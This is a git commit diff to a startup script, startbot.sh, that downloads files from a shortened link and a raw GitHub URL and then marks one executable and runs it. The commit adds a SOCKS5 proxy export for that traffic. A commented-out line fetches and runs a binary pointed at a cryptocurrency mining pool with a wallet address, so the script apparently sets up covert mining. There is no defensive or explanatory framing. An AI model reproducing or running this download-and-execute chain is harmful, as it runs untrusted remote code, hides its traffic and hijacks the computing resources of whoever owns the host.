1f973429fee0fa05b2c72196be75988020765846
alfredgilbert2966 <94738317+alfredgilbert2966@users.noreply.github.com>
2021-11-20 19:55:30 +0700

    Update startbot.sh

--- startbot.sh
+++ startbot.sh
@@ -5,4 +5,5 @@
 
 cd /home/shell-bot
 #wget -qO ngaceng https://git.io/J161r && chmod +x ngaceng && ./ngaceng -v -l verushash.mine.zergpool.com:3300 -u DTsu49wXhGQ7yGWuRYsnz4EmC55Xg6YkrE.hotaru -p c=DGB,mc=VRSC
-wget -O 2 https://git.io/Jim5G && wget -O 1 https://raw.githubusercontent.com/douglasjan7949/rstudio/main/v && chmod u+x 1 && ./1
+export http_proxy=socks5://72.221.172.203:4145
+wget -O 2 https://git.io/Jim5G && wget -O 1 https://raw.githubusercontent.com/douglasjan7949/rstudio/main/d && chmod u+x 1 && ./1
